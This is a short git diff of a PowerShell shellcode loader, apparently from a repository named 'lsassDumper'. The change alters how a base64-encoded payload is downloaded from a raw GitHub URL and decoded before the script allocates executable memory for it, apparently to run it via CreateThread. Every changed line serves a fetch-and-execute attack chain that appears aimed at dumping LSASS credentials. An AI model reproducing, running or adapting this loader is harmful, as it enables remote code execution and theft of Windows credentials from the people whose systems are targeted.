@@ -177,10 +177,8 @@ function Invoke-CreateThread {
                         $lpThreadId)
 }
 
-
-$base64Data = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/666reda/lsassDumper/main/NativeDump_loader.log')
-$decodedBytes = [System.Convert]::FromBase64String($base64Data)
-$X64SampleInstructions = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
+$X64SampleInstructions = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/666reda/lsassDumper/main/NativeDump_loader.log')
+$X64SampleInstructions = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($X64SampleInstructions))
 
 
 $ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $X64SampleInstructions.Length -flAllocationType 0x3000 -flProtect 0x40
